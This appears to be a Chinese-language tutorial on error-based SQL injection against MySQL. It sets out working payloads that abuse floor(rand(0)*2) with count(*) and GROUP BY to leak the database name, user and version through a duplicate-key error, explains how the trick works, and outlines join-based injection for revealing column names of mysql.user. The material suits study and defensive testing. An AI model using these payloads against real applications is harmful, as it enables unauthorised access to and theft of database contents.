# sql inject 回显报错

## concat(*) + rand + group by

```
SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(select+concat(0x5f,database(),0x5f,user(),0x5f,version())))a+from+information_schema.tables+group+by+a)b--
```

#### 分析

本质是group by语句的报错。group by语句报错的原因是floor(rand(0)*2)的不确定性，即可能为0也可能为1,(group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中则更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。group by floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值

* 主要是rand和group+by的冲突。获取的值不确定又可重复,同时又要来操作结果

> RAND() in a WHERE clause is re-evaluated every time the WHERE is executed.You cannot use a column with RAND() values in an ORDER BY clause, because ORDER BY would evaluate the column multiple times.             
说的是不可以作为ORDER BY的条件字段, 同理也不可以为group by的.

故：a为：concat(floor(rand(0)*2),(select+concat(0x5f,database(),0x5f,user(),0x5f,version())))

有rand参与，后面又出现group+by+a语句，故会爆出
```
Duplicate entry 'XXXXXXXXXX' for key 'group_key'
```
之类的错误。而这里的“'XXXXXXXXXX”就是 **0x5f,database(),0x5f,user(),0x5f,version()**的内容，这样子就可以获取到数据库名，用户名和数据库版本。

* 1.floor是取整数，如果没有这个，那么RAND(0)*2将是一个很长的小数，不会是 会重复的数。

* 2.rand(0)*2是取0到2的随机数，如果去掉或换成1，加上floor取整结果都是0，不会是不确定的数。当然,使用 *3，*4, ... 都是可以的

* 3.如果没有重新刷一次结果（例子中用的是count(*)来统计结果）,单纯以rand制造会重复的不确定数也是没有效果的，如去掉count(*),不会报错。

正常的：
```
SELECT id FROM tuser WHERE id=1 UNION SELECT 1 FROM (SELECT CONCAT(FLOOR(RAND(0)*2),(SELECT CONCAT(0x5f,DATABASE(),0x5f,USER(),0x5f,VERSION())))a FROM information_schema.tables GROUP BY a)b--
```

所以使用left(rand(),3)之类的也是可以的（会产生会重复不确定的数）如：

报错的：
```
SELECT id FROM tuser WHERE id=1 UNION SELECT 1 FROM (SELECT COUNT(*),CONCAT(LEFT(RAND(),3),(SELECT CONCAT(0x5f,DATABASE(),0x5f,USER(),0x5f,VERSION())))a FROM information_schema.tables GROUP BY a)b--
```


## join报错注入

#### 原理

**利用表自己join自己。来达到列名相同来爆列名**

以爆mysql.user表为例爆字段名为例

* 1.爆第一个列名

* 2.爆第二个列名(使用using)

* 3.爆第三列名(还是使用using，参数是前两个列的列名)

...

* 爆完列名后，使用完整的列名，就可以爆数据了
